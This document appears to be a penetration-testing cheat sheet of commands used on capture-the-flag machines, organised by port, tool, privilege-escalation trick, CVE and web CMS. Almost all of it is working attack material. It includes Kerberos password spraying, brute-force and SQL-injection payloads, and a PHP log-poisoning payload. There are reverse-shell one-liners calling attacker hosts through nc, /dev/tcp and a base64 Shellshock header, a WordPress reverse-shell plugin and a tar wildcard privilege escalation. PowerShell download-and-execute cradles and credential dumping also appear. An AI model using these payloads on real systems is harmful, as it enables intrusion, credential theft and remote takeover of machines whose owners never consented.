# EzpzCheatSheet
This CheatSheet will not have much explanation. It just a commands that has been used pwning all of the machines from various platform and something that I have encounter before.



# A. Ports

### 25 (SMTP)

```bash
# Nmap

# Enum Users
smtp-user-enum -M VRFY -U /usr/share/seclists/Usernames/xato-net-10-million-usernames.txt -t 10.10.10.10

# Swaks (Send Email)
swaks --to nik@bank.local --from aniq@bank.local --header "Subject: Welcome" --body "Enjoy your stay!" --server 10.10.10.10
```

### 53 (DNS)

```bash
# Install
sudo apt install dnsutils

# Nmap
nmap -n --script "(default and *dns*) or fcrdns or dns-srv-enum or dns-random-txid or dns-random-srcport" 10.10.10.10

# Nslookup
nslookup 10.10.10.10
	* server 10.10.10.10
	* 10.10.10.10

```

### 88 (Kerberos)

```bash
# Nmap


# Enumerate Users
kerbrute userenum -d bank.local --dc 10.10.10.10 /usr/share/seclists/Usernames/xato-net-10-million-usernames.txt

# Bruteforce User
kerbrute bruteuser -d bank.local --dc 10.10.10.10 rockyou.txt nik

# Passwword Spray
kerbrute passwordspray -d bank.local --dc 10.10.10.10 user.txt 'Password@123!'

# Kerberoasting
GetUserSPNs.py bank.local/nik:'Password@123!' -dc-ip 10.10.10.10 -request -outputfile output.txt

# bloodhound-python
bloodhound-python -u 'nik' -p 'Password@123!' -d 'bank.locall' -ns 10.10.10.10
```

### 110,995 (POP3)

```bash
# Nmap

# Banner Grabbing
nc -nv 10.10.10.10 110
openssl s_client -connect 10.10.10.10:995 -crlf -quiet

# Connect
telnet 10.10.10.10 110
	* USER nik
	* PASS Password@123!
	* list
	* retr 1
	* quit
```

### 135,593 (RPC)

```bash
# Nmap

# Rpcclient
rpcclient -U '' -N 10.10.10.10

# Rpcclient Commands
- enumdomusers
- netshareenum
- netshareenumall
- srvinfo
- queryuser 500
- querydispinfo
```

### 139,445 (SMB)

```bash
# Nmap
nmap --script "safe or smb-enum-*" -p 445 10.10.10.10
nmap --script smb-vuln\* -p 137,139,445 10.10.10.10

# Smbmap
smbmap -H 10.10.10.10
smbmap -H 10.10.10.10 -u raj -p 123 
smbmap -H 10.10.10.10 -P 139

# Smbclient
smbclient -L 10.10.10.10
smbclient -N \\\\10.10.10.10\\Users -c "prompt OFF;recurse ON;mget *"
smbclient -N \\\\10.10.10.10\\Users -c "prompt OFF;recurse ON;ls"
smbclient -U 'nik' \\\\10.10.10.10\\Data -c "prompt OFF;recurse ON;mget *" 'Password@123!'
smbclient -U 'nik' \\\\10.10.10.10\\Data -c "prompt OFF;recurse ON;ls" 'Password@123!'

# Smbget
smbget -R smb://10.10.10.10/users$/nik/nik.xml -U 'nik'

# Crackmapexec
crackmapexec smb --gen-relay-list targets.txt 10.10.10.0/24
crackmapexec smb 10.10.10.10 -u 'nik' -p 'Password@123!' -X whoami --amsi-bypass /tmp/amsiibypass
crackmapexec smb 10.10.10.10 -u 'nik' -p 'Password@123!' -x whoami 

# Enum4linux
enum4linux 10.10.10.10
```

### 161,162 (SNMP - UDP)

```bash
# Install
pip install snmpclitools

# Snmp-check
snmp-check 10.10.10.10 -c public

# Snmpwalk
snmpwalk -v1 -c public 10.10.10.10
snmpwalk -c public 10.10.10.10
snmpwalk -v1 -c public 10.10.10.10 1
snmpwalk -v1 -c public 10.10.10.10 2
```

### 636 (LDAP)

```bash
# Nmap
nmap -n -sV --script "ldap\* and not brute" 10.10.10.10

# LdapSearch
ldapsearch -h 10.10.10.10 -x -b 'DC=bank,DC=local' -s sub
ldapsearch -LLL -x -H ldap://10.10.10.10 -b '' -s base '(objectclass=\*)'
ldapsearch -x -h 10.10.10.10 -D 'bank.local\nik' -w 'Password@123!' -b 'CN=Users,DC=bank,DC=local'

```

### 2049 (NFS MOUNT)

```bash
# Showmount
showmount -e 10.10.10.10

# Mount
mount -t nfs 10.10.10.10:/home mnt
mount -o vers=3 -t nfs 10.10.10.10:/home mnt
```

### 3128 (SQUID PROXY)

```bash

# Ffuf
ffuf -u 'http://10.10.10.10/FUZZ' -w common.txt:FUZZ -x http://10.10.10.10:3128

# proxychains
echo "http 10.10.10.10 3128" >> /etc/proxychains.conf
	* proxychains ssh john@10.10.10.10
```

### 3306 (MYSQL)

```bash
# Commands
mysql -u root -p -h 10.10.10.10
mysql -u root -pPassword123 -e "use drupal;select * from users"

# Bruteforce
hydra -l nik -p password.txt 10.10.10.10 mysql -t 30 -f

# Check UDF
select * from msql.func;

# Mysql Commands
select sys_exec('whoami');
```

### 3389 (RDP)

```bash
# Nmap
nmap -p 3389 --script=rdp-vuln-* 10.10.10.10

# Commands
xfreerdp /u:nik /p:'Password@123!' /cert:ignore /v:10.10.10.10
xfreerdp /u:admin /p:password /cert:ignore /v:10.10.10.10 /drive:share_mount,/opt/folder_to_mount
```

### 3632 (DISTCC)

```bash
# Nmap
nmap -p 3632 10.10.10.10 --script distcc-exec --script-args="distcc-exec.cmd='id'"

```

### 6379 (REDIS)

```bash
# Install
sudo apt-get install redis-tools

# Commands
redis-cli -h 10.10.10.10
	* keys *
	* get pk:ids:User

```

### 27017,27018 (MONGODB)

```bash
# Commands
mongo localhost:27017/myplace -u nik -p Password123
	* show dbs
	* use <db>
	* show collections
	* db.<collection found>.find()
	* db.<collection found>.insert( { _id: 1, cmd: "curl 10.10.14.4/test"} )
```

# B. Tools/Techniques

### Port Knocking

```bash
# Commands
knocker.py -p 8890,7000,666 10.10.10.10
for i in 571 290 911;do nmap -n -v0 -Pn --max-retries 0 -p $i 10.10.10.10;done
knock 10.10.10.10 7000:666:8890

# Permutation (Port)
python -c 'import itertools; print list(itertools.permutations(\[8890,7000,666\]))' | sed 's/), /\\n/g' | tr -cd '0-9,\\n' | sort | uniq > permutation.txt

```

### SQL Injection

```bash
[MYSQL]
## Get Current Database
database()

## Get Database
UNION SELECT table_schema FROM information_schema.tables

## Get Table Name
UNION SELECT table_name FROM information_schema.tables WHERE table_schema == "database"

## Get Column Name
UNION SELECT table_name, column_name FROM information_schema.columns

###===Time Based===
## Get Database
(SELECT sleep(5) from dual where substring(database(),1,1)='h') 
(SELECT sleep(5) from dual where substring(database(),2,1)='h') 

## Get Tables
(SELECT sleep(5) from information_schema.tables where table_name LIKE '%hotel%')

## Get Columns
(SELECT sleep(5) from information_schema.columns where column_name LIKE '%room%' AND table_name='hotel')

## Extract
IF((select MID(user,1,1) from mysql.user limit 0,1)='D' , sleep(5),0)

## Extra
(select IF(500>1000, "nothing", sleep(5)))

###===Union Based===
## Get Database
9999 union select 1,database(),3,4,5

## Get Tables
9999 union select 1,group_concat(table_name),3,4,5 from information_schema.tables where table_schema like "%hotel%"

## Get Columns
9999 union select 1, group_concat(column_name),3,4,5 from information_schema.columns where table_name like "%room%" 

## Extract
9999 union select 1,group_concat(user,":",password),3,4,5 from mysql.user

```

### Hydra

```bash
# Install
sudo apt-get install hydra-gtk

# Commands
hydra -l nik -p rockyou.txt 10.10.10.10 ssh -t 30 -f
hydra -L user.txt -P pass.txt 10.10.10.10 ssh -t 30 -f
hydra -L user.txt -P pass.txt 10.10.10.10 ssh -s 2222 -t 30 -f

# Json
hydra -l admin -P rockyou.txt localhost http-post-form '/api/login:{"username"\:"^USER^","password"\:"^PASS^","recaptcha"\:""}:Forbidden' -V -f
```

### JsonBrute

```bash
# Download
https://github.com/Jake-Ruston/JSONBrute

#Example 1
python3 jsonbrute.py --url http://localhost/v2/login --wordlist rockyou.txt --data "username=user, password=FUZZ" --code 200

#Example 2
python3 jsonbrute.py --url http://localhost/api/login --wordlist rockyou.txt --data "username=admin, password=FUZZ, recaptcha= " --code 200 --verbose
```

### Wfuzz

```bash
#PROXY (-p)
wfuzz -u http://localhost/authenticate -w test.txt -d "uname=admin&psw=FUZZ&remember=on" -p 127.0.0.1:8080 -H "Referer: http://localhost/authenticate"

#COOKIES (-b)
wfuzz -u http://localhost/admin/FUZZ.php -w big.txt -b PHPSESSID=1e28or9cmi6ua05d78tov7j7t4 --hc 404

#POST & output in url (/?login=username_incorrect)
wfuzz -u http://localhost/login -w users.txt -w pass.txt -d "username=FUZZ&password=FUZ2Z"
```

### Ffuf

```bash
# Install

# Commands
ffuf -u 'http://10.10.10.10/FUZZ' -w common.txt:FUZZ -e .php,.html,.txt,.bak -t 50
ffuf -u 'https://FUZZ.bank.local' -w subdomains-top1million-20000.txt:FUZZ -t 30
ffuf -u 'http://10.10.10.10/' -w sqli.txt:FUZZ -X POST -H "Content-Type: application/x-www-form-urlencoded" -d "username=FUZZ&password=FUZZ" -fc 200

# POST Method
ffuf -u 'http://10.10.10.10/main/wp-login.php' -w user.txt:USER -w pass.txt:PASS -X POST -H "Content-Type: application/x-www-form-urlencoded" -d "log=USER&pwd=PASS&wp-submit=Log+In"
ffuf -u 'http://10.10.10.10/login.php' -w user.txt:FUZZ -w pass.txt:FUZ2Z -X POST -H "Content-Type: application/x-www-form-urlencoded" -d "user=FUZZ&pass=FUZ2Z" --fc 200
ffuf -u 'http:/10.10.10.10/login.php' -w user.txt:FUZZ -w pass.txt:FUZ2Z -X POST -H "Content-Type: application/x-www-form-urlencoded" -d "user=FUZZ&pass=FUZ2Z"

# With proxy
ffuf -u 'http://10.10.10.10/FUZZ' -w common.txt:FUZZ -t 30 -e .php,.html,.txt -x http://10.10.10.10:3128
```

### Uploading Files

```bash
Change content-type
    * text/thml
extension
    * .png.php
    * .php.png
    * .php%00.png
```

### Local File Inclusion (LFI)

```bash
# Wordlists
/var/log/mail.log
/etc/passwd
/etc/ldap.secret
/etc/shadow
/etc/hosts
/etc/knockd.conf

#(1)-----[/var/log/mail.log]-----
nc 10.10.10.10 25

HELO test
MAIL FROM: "test <?php system($_GET['cmd']);?>"
RCPT TO: root
DATA
.
#RCE
/var/log/mail&cmd=ls -la
```

### Remote Command Execution (RCE)

```bash
# Payload Command Execution
'$(nc -e /bin/bash 192.168.149.129 4444)'
"$(printf 'aaa\n/bin/sh\nls')"
() { :;}; /bin/bash
```

### Socat

```bash
socat tcp-listen:8009,fork tcp:192.168.56.104:8009 &
socat tcp-listen:8080,fork tcp:192.168.56.104:8080 &
socat tcp-listen:34483,fork tcp:192.168.56.104:34483 &
socat tcp-listen:4321,fork tcp:192.168.56.104:4321 &
```

### Chisel

```bash
# Chisel
https://github.com/jpillora/chisel

## Client Machine
./chisel client 10.66.67.154:8000 R:25:127.0.0.1:25

## Attacker Machine
./chisel server -p 8000 --reverse
```

### Ping Sweep

```bash
#!/bin/bash

for i in {1..255}; do 
        if out=$(ping -c 1 10.10.10.$i); then
                echo "$out" | grep ttl | cut -d " " -f4 | cut -d ":" -f1
                echo "$out" | grep ttl | cut -d " " -f4 | cut -d ":" -f1 >> ip.txt
        fi
done
```

### Stegseek

### Binwalk

### Crunch

```bash
#options (-t)
=> crunch 5 5 -t @@@@@ -o alphabet.txt
@ will insert lower case characters
, will insert upper case characters
% will insert numbers
^ will insert symbols
```

### Kwprocessor

```bash
# Download
https://github.com/hashcat/kwprocessor

# Commands
./kwp basechar.txt keymap.txt route.txt
./kwp -z basechars/full.base keymaps/en-us.keymap routes/2-to-16-max-3-direction-changes.route
```

### PrivescCheck.ps1

```bash
# Download
wget https://raw.githubusercontent.com/itm4n/PrivescCheck/master/PrivescCheck.ps1

# Get File from Victim Machine
wget http://10.10.14.16:80/PrivescCheck.ps1 -outfile PrivescCheck.ps1

# Commands
. .\PrivescCheck.ps1
Invoke-PrivescCheck

# Directly
IEX(IWR http://10.10.10.10/PrivescCheck.ps1 -UseBasicParsing); Invoke-PrivescCheck
```

### Windows-Exploit-Suggester 

```bash
# Download
wget https://raw.githubusercontent.com/AonCyberLabs/Windows-Exploit-Suggester/master/windows-exploit-suggester.py

# Commands
python windows-exploit-suggester.py --update
python windows-exploit-suggester.py -i systeminfo.txt -d 2021-04-23-mssb.xls
```

### WebDav

```bash
# Commands
davtest -url http://10.10.10.15
cadaver http://10.10.10.15/   
	* put shell.txt
	* move shell.txt shell.aspx
```

### Threader3000

```bash
# Install
pip3 install threader3000

# Commands
threader3000

# One Liner
for i in $(cat ip.txt); do echo "["$i"]" >> port.txt; echo "" >> port.txt;echo $i | threader3000 | grep "open" >> port.txt; echo "" >> port.txt;done

# References
- https://github.com/dievus/threader3000
```

### Seatbelt.exe

```bash
# Download
https://github.com/r3motecontrol/Ghostpack-CompiledBinaries

# Usage
Seatbelt.exe all
```

### File Transfer

```bash
# SMB
- Create one folder name profile (mkdir profile)
- sudo /opt/Tools/impacket/examples/smbserver.py items profile
- net view \\10.10.10.10
- copy items.db \\10.10.10.10\ITEMS\items.db

# References
https://medium.com/@PenTest_duck/almost-all-the-ways-to-file-transfer-1bd6bf710d65
```

### Firefox Decrypt

```bash
# Download
https://github.com/unode/firefox_decrypt.git

# Usage
- Ensure that these files in the folder
	* logins.json
	* cookies.sqlite
	* key4.db
	* cert9.db
- python3 firefox_decrypt.py /opt/Training/Gatekeeper/profile
```

### Sshuttle

```bash
# Commands
sshuttle -vr sshuser@10.10.10.10 192.168.0.1/24
sshuttle -vr sshuser@10.10.10.10 192.168.0.1/16
````

### Pwsh

### Invoke-Mimikatz.ps1

### Rubeus

### Covenant

```bash

# Commands
ImpersonateProcess 1776
ImpersonateProcess <PID>

# Rubeus
- Rubeus kerberoast admin hashcat
- Rubeus klist


# Import Powershell
- PowerShellImport 
- Choose file


# Powerview.ps1
- Powershell Get-DomainUser -TrustedToAuth


# Inveigh
- Powershell Invoke-InveighRelay -ConsoleOutput -Y -StatusOutput N -Command "net user commandtest Passw0rd123! /add" -Attack Enumerate,Execute,Session
- Powershell Invoke-Inveigh -ConsoleOutput Y

```

### Impacket Tools

```bash
# GetNPUsers.py
GetNPUsers.py -dc-ip 10.10.10.10 -request 'bank.local/' -no-pass -usersfile user.txt -format hashcat

# GetUserSPNs.py
GetUserSPNs.py bank.local/nik:'Password@123!' -dc-ip 10.10.10.10 -request -outputfile output.txt

# secretsdump.py
secretsdump.py -just-dc bank.local/nik:'Password@123!'@10.10.10.10
```

### Objection

```bash
# Install 
pip3 install -U objection 

# Commands 
- objection patchapk --source base.apk 
- objection patchapk --source base.apk -a arm64
- adb install base.objection.apk 
- objection -g com.app.yes explore 
- objection explore (Make sure to open the application first in our mobile phone before run) 

#==Android==
* android sslpinning disable 

#==Ios==
* ios sslpinning disable

# References 
- https://gowthamr1.medium.com/android-ssl-pinning-bypass-using-objection-and-frida-scripts-f8199571e7d8 
- https://github.com/sensepost/objection/tree/master/objection/console/helpfiles
- https://rehex.ninja/posts/frida-cheatsheet/
- https://cheatography.com/hnd/cheat-sheets/objection-ios/
```

### Ysoserial

```bash
# Download
https://github.com/pwntester/ysoserial.net

# Commands
##==Json.Net==
.\ysoserial.exe -f Json.Net -g ObjectDataProvider -o raw -c "powershell curl http://10.10.10.10/"

```

### Python Scripter (Burp)

```bash
# Install
- https://portswigger.net/bappstore/eb563ada801346e6bdb7a7d7c5c52583

# References
- https://gist.github.com/lanmaster53/3d868369d0ba5144b215921d4e11b052
- https://github.com/PortSwigger/python-scripter
```

# C. SUID/CAP/SUDO/GROUP

### LXD

### Node

### Cat

### Snap

### Msfconsole

### Docker

### Initctl

### WildCard (*)

```bash
#===Chown/Chmod===
- Imagine there is a cronjob 
	* chown user1:user2 /opt/*
- touch -- --reference=reference
- ln -s /etc/shadow /opt/shadow
- ln -d -s /root /opt/root

## References
- https://materials.rangeforce.com/tutorial/2019/11/08/Linux-PrivEsc-Wildcard/

#===Tar===
- Imagine there is cronjob
	* cd /opt;tar cf /opt/backup.tar *
- touch -- "--checkpoint=1"
- touch -- "--checkpoint-action=exec=sh shell.sh"
- echo "rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 10.10.10.10 443 >/tmp/f" > shell.sh
- chmod 777 ./"--checkpoint=1"
- chmod 777 ./"--checkpoint-action=exec=sh shell.sh"
- chmod 777 shell.sh

#===Parameter===
- Imagine there is wildcard in binary with --help
	* sudo cat * --help
- sudo cat /etc/paswd -help
- Try to look if there is any more parameter that can run so that it will run that before --help
 
## References
- https://materials.rangeforce.com/tutorial/2019/11/08/Linux-PrivEsc-Wildcard/

```


# D. Exploit/CVE/Abuse/Misconf

### ShellShock

```bash
# Payload
curl -H "user-agent: () { :; }; echo; echo; /bin/bash -c 'cat /etc/passwd'" http://10.10.10.10/cgi-bin/test.cgi
curl -H "user-agent: () { :; }; echo; echo; /bin/bash -c 'echo YmFzaCAtaSA+JiAvZGV2L3RjcC8xOTIuMTY4LjExOS4xMjMvNDQzIDA+JjE= | base64 -d | bash'" http://10.10.10.10/cgi-bin/admin.cgi

# Refernces
https://github.com/opsxcq/exploit-CVE-2014-6271
```


### MS-17-010

### MS08-067

### SeImpersonatePrivilege

### MS11-046

### MS16-098

### MS10-059

### Token Kidnapping (Windows 2003)

### DirtySock

### ChrootKit

### IIS 6.0 (CVE-2017-7269)

### AlwaysInstall Elevated

### Ptrace

### FTP Backdoor Command Execution

### Shadow Writable

### OpenSMPTD < 6 (Local Privesc)

### PHP Info + LFI

### DirtyCow

### Ubuntu

```bash
# Kernel 
# < 2.6.37 
- https://www.exploit-db.com/exploits/15704 

# < 3.10
- https://www.exploit-db.com/exploits/18411
	* https://github.com/lucyoa/kernel-exploits/tree/master/memodipper

# < 3.19
- https://www.exploit-db.com/exploits/37292
```

# E. CMS/Web

### Wordpress

```bash
# Wpscan
wpscan --url https://10.10.10.10/blog/ -e u,vp --disable-tls-checks
wpscan --url http://10.10.10.10/blog/ -e u --passwords rockyou.txt

# Location
/wp-content/plugins/

# Default Credentials 
admin:password 
wordpress:wordpress 
root:toor

# Reverse Shell
## Plugins
<?php

/**
* Plugin Name: Reverse Shell Plugin
* Plugin URI:
* Description: Reverse Shell Plugin
* Version: 1.0
* Author: H0j3n
* Author URI: https://h0j3n.blog/
*/

exec("/bin/bash -c 'bash -i > /dev/tcp/10.10.10.10/443 0>&1'");
?>

- save as shell.php
- zip shell.zip shell.php

# Plugins Vulnerable
##===CVE-2014-2383===
- /wp-content/plugins/post-pdf-export/images/download-icon.png
- /dompdf.php?input_file=php://filter/read=convert.base64-encode/resource=/etc/passwd
- https://www.portcullis-security.com/security-research-and-downloads/security-advisories/cve-2014-2383/
```

### NibbleBlog

```bash
# Download Exploit Here
wget https://raw.githubusercontent.com/TheRealHetfield/exploits/master/nibbleBlog_fileUpload.py

# Commands
#==Manual==
# Step 1:
- Go to http://10.10.10.10/nibbleblog/admin.php?controller=plugins&action=config&plugin=my_image
- Upload php reverse shell
# Step 2
- Listening
- Go to http://10.10.10.10/nibbleblog/content/private/plugins/my_image/image.php
```

### HTTPFileServer

```bash
# Links
- https://www.exploit-db.com/exploits/49125
	* python3 exploit3.py 10.10.10.10 80 "c:\windows\system32\WindowsPowershell\v1.0\powershell.exe IEX (New-Object Net.WebClient).DownloadString('http://10.10.10.11/Invoke-PowerShellTcp.ps1');Invoke-PowerShellTcp -Reverse -IPAddress 10.10.10.11 -Port 443"
	* python3 exploit3.py 10.10.10.10 80 "C:\Users\kostas\Desktop\nc.exe -e cmd.exe 10.10.10.11 443"
- https://www.exploit-db.com/exploits/39161
	* Change lhost,lport
- https://www.exploit-db.com/exploits/49584
	* Change lhost,lport,rhost,rport (Depends windows version)
```

### Drupal

```bash
# Scanner
## drupwn
git clone https://github.com/immunIT/drupwn.git
python3 -m pip install -r requirements.txt
./drupwn --target  http://10.10.10.9/  --mode enum

##droopescan
droopescan scan drupal -u http://10.10.10.9/

# 7.x Exploit
https://www.exploit-db.com/exploits/41564
searchsploit -x php/webapps/44449.rb > exploit.rb
	- ruby exploit.rb http://10.10.10.10./ --verbose
```

### Elastix

```bash
# Download
searchsploit -x php/webapps/18650.py > output.py

# Usage
- Change lport
- Run

# Lfi
/vtigercrm/graph.php?current_language=../../../../../../../..//etc/amportal.conf%00&module=Accounts&action
```

### CMS Made Simple

```bash
# SQL Injection
https://www.exploit-db.com/exploits/46635

# Usage
python exploit.py -u http://10.10.10.10/writeup
```


### Umbraco

```bash
# Download
git clone https://github.com/noraj/Umbraco-RCE.git

# Usage
python exploit.py -u 'user@email.com' -p 'password' -i http://10.10.10.10 -c powershell.exe -a 'whoami'
```

### ThinVNC

```bash
# File Traversal - Better use burpsuite
- http://IP:PORT/<Anything>/../../ThinVnc.ini
```


### Voting System

```bash
# File Upload RCE
https://www.exploit-db.com/exploits/49445

# References
https://www.sourcecodester.com/php/12306/voting-system-using-php.html
```

### Osticket

```bash
# File location
/var/www/osticket/upload/include/ost_config.php
```

# F. Reverse Shell

### PowerShell

```powershell
# ConPtyShell (Interactive Powershell)

```

# References
- https://github.com/swisskyrepo/PayloadsAllTheThings
- https://book.hacktricks.xyz/

